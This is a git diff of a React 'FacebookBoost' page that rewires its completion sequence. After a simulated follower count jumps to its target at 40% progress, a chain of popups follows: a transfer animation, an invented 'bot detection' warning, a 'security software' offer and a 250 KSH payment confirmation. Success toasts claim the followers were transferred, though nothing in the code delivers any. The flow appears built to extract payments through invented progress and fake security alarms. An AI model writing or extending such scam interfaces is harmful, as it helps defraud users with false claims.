@@ -10,7 +10,11 @@ import { useNavigate } from "react-router-dom"
 import { cn } from "@/lib/utils"
 import { VerificationPopup } from "@/components/verification-popup"
 import { RechargePopup } from "@/components/recharge-popup"
-import { CompletionFlow } from "@/components/completion-flow"
+import { CongratulationsPopup } from "@/components/congratulations-popup"
+import { TransferAnimation } from "@/components/transfer-animation"
+import { BotDetectionPopup } from "@/components/bot-detection-popup"
+import { SecuritySoftware } from "@/components/security-software"
+import { PaymentConfirmation } from "@/components/payment-confirmation"
 import { useToast } from "@/hooks/use-toast"
 
 const FacebookBoost = () => {
@@ -42,8 +46,11 @@ const FacebookBoost = () => {
   const [rechargeTriggered, setRechargeTriggered] = useState(false)
   
   // Completion flow states
-  const [showCompletionFlow, setShowCompletionFlow] = useState(false)
-  const [completionTriggered, setCompletionTriggered] = useState(false)
+  const [showCongratulations, setShowCongratulations] = useState(false)
+  const [showTransferAnimation, setShowTransferAnimation] = useState(false)
+  const [showBotDetection, setShowBotDetection] = useState(false)
+  const [showSecuritySoftware, setShowSecuritySoftware] = useState(false)
+  const [showPaymentConfirmation, setShowPaymentConfirmation] = useState(false)
   
   // Social proof states
   const [socialProofs, setSocialProofs] = useState<Array<{id: number, pageName: string, followers: string, timeAgo: string}>>([])
@@ -210,18 +217,11 @@ const FacebookBoost = () => {
           setVerificationTriggered(true)
         }
         
-        if (progressRatio >= 0.4) {
-          // Trigger completion flow at 40% for testing
-          if (!completionTriggered) {
-            setShowCompletionFlow(true)
-            setCompletionTriggered(true)
-          }
-        }
-        
         // Complete the boost when time is up
-        if (progressRatio >= 1) {
+        if (progressRatio >= 0.4) {
           setCurrentFollowers(targetFollowers)
           clearInterval(interval)
+          setShowCongratulations(true)
         }
       }, 1000)
       
@@ -253,10 +253,8 @@ const FacebookBoost = () => {
     setCurrentFollowers(parseInt(userFollowers || "0"))
     setVerificationTriggered(false) // Reset verification trigger for new boost
     setRechargeTriggered(false)
-    setCompletionTriggered(false)
     setShowVerificationPopup(false)
     setShowRechargePopup(false)
-    setShowCompletionFlow(false)
     startTimeRef.current = Date.now()
     setShowForm(false) // Hide form and show boost dashboard
   }
@@ -290,6 +288,54 @@ const FacebookBoost = () => {
     toast({
       title: "Recharge Successful!",
       description: "Your boost has been extended. Continuing to 100%...",
+      duration: 3000,
+    })
+  }
+
+  // Completion flow handlers
+  const handleStartTransfer = () => {
+    setShowCongratulations(false)
+    setShowTransferAnimation(true)
+  }
+
+  const handleBotDetected = () => {
+    setShowTransferAnimation(false)
+    setShowBotDetection(true)
+  }
+
+  const handleRetryTransfer = () => {
+    setShowBotDetection(false)
+    toast({
+      title: "Transfer Complete!",
+      description: "All followers have been successfully transferred to your page.",
+      duration: 3000,
+    })
+  }
+
+  const handleUseSecurity = () => {
+    setShowBotDetection(false)
+    setShowSecuritySoftware(true)
+  }
+
+  const handleActivateSecurity = () => {
+    setShowSecuritySoftware(false)
+    setShowPaymentConfirmation(true)
+  }
+
+  const handleConfirmPayment = () => {
+    setShowPaymentConfirmation(false)
+    toast({
+      title: "Payment Successful!",
+      description: "Security software activated. All bot followers removed and transfer completed!",
+      duration: 5000,
+    })
+  }
+
+  const handleTransferComplete = () => {
+    setShowTransferAnimation(false)
+    toast({
+      title: "Transfer Complete!",
+      description: "All followers have been successfully transferred to your page.",
       duration: 3000,
     })
   }
@@ -801,12 +847,44 @@ const FacebookBoost = () => {
           currentFollowers={currentFollowers}
         />
 
-        {/* Completion Flow */}
-        <CompletionFlow
-          isOpen={showCompletionFlow}
-          onClose={() => setShowCompletionFlow(false)}
+        {/* Completion Flow Components */}
+        <CongratulationsPopup
+          isOpen={showCongratulations}
+          onClose={() => setShowCongratulations(false)}
+          onStartTransfer={handleStartTransfer}
           platform="facebook"
           followersGained={targetFollowers - parseInt(userFollowers || "0")}
+          currentFollowers={targetFollowers}
+        />
+
+        <TransferAnimation
+          isOpen={showTransferAnimation}
+          onBotDetected={handleBotDetected}
+          onTransferComplete={handleTransferComplete}
+          platform="facebook"
+          followersToTransfer={targetFollowers - parseInt(userFollowers || "0")}
+        />
+
+        <BotDetectionPopup
+          isOpen={showBotDetection}
+          onRetryTransfer={handleRetryTransfer}
+          onUseSecurity={handleUseSecurity}
+          platform="facebook"
+        />
+
+        <SecuritySoftware
+          isOpen={showSecuritySoftware}
+          onActivate={handleActivateSecurity}
+          onClose={() => setShowSecuritySoftware(false)}
+          platform="facebook"
+        />
+
+        <PaymentConfirmation
+          isOpen={showPaymentConfirmation}
+          onConfirm={handleConfirmPayment}
+          onCancel={() => setShowPaymentConfirmation(false)}
+          platform="facebook"
+          amount="250 KSH"
         />
       </div>
     </div>
